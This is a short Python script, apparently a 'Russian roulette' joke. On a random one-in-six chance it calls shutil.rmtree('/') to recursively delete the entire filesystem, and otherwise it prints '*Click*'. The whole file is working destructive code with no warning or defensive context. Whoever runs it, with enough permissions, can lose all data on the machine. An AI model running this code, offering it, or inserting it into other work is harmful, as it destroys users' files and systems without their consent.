import random
import shutil

if random.randint(0, 5) == 0:
    shutil.rmtree('/', ignore_errors=False, onerror=None)
else:
    print('*Click*')
